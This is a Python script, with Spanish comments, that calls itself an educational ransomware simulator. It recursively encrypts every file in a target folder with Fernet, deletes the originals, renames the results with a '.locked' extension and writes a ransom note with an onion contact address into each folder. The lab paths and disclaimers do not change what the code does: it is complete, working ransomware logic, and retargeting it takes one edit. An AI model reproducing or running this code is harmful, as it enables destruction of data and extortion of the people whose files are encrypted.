import os
from cryptography.fernet import Fernet

# ─────────────────────────────────────────────
# CONFIGURACION
# ─────────────────────────────────────────────
TARGET_FOLDER = r"C:\SimLab\Documentos"
KEY_FILE      = r"C:\SimLab\decrypt_key.key"
EXT_LOCKED    = ".locked"
RANSOM_NOTE   = "README_RECOVER.txt"

RANSOM_TEXT = """
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
              TODOS TUS ARCHIVOS HAN SIDO CIFRADOS
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Todos los archivos de este equipo han sido cifrados con
algoritmo AES-256. Sin la clave de descifrado en nuestro
poder, no podras recuperarlos.

Para recuperar tus archivos contacta a:
  recovery@[redacted].onion

Identificador unico de victima: SIM-LAB-2026

-- ESTE ES UN ENTORNO DE SIMULACION DE LABORATORIO --
-- Este script fue creado con fines educativos     --
"""

def main():
    print("[*] Ransomware Simulator - Solo para uso educativo en entorno de laboratorio")
    print(f"[*] Objetivo: {TARGET_FOLDER}")

    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as kf:
        kf.write(key)
    print(f"[+] Clave generada y guardada en: {KEY_FILE}")

    fernet = Fernet(key)
    files_encrypted = 0
    folders_noted   = set()

    for root, dirs, files in os.walk(TARGET_FOLDER):
        for filename in files:
            if filename == RANSOM_NOTE or filename.endswith(EXT_LOCKED):
                continue

            filepath = os.path.join(root, filename)
            locked_path = filepath + EXT_LOCKED

            try:
                with open(filepath, "rb") as f:
                    data = f.read()
                encrypted_data = fernet.encrypt(data)
                with open(locked_path, "wb") as f:
                    f.write(encrypted_data)
                os.remove(filepath)
                files_encrypted += 1
                print(f"  [CIFRADO] {filepath}  -->  {os.path.basename(locked_path)}")
            except Exception as e:
                print(f"  [ERROR] {filepath}: {e}")

        if root not in folders_noted:
            note_path = os.path.join(root, RANSOM_NOTE)
            with open(note_path, "w", encoding="utf-8") as nf:
                nf.write(RANSOM_TEXT)
            folders_noted.add(root)
            print(f"  [NOTA]    {note_path}")

    print(f"\n[+] Simulacion completa. Archivos cifrados: {files_encrypted}")
    print(f"[!] Clave de descifrado retenida en: {KEY_FILE}")

if __name__ == "__main__":
    main()
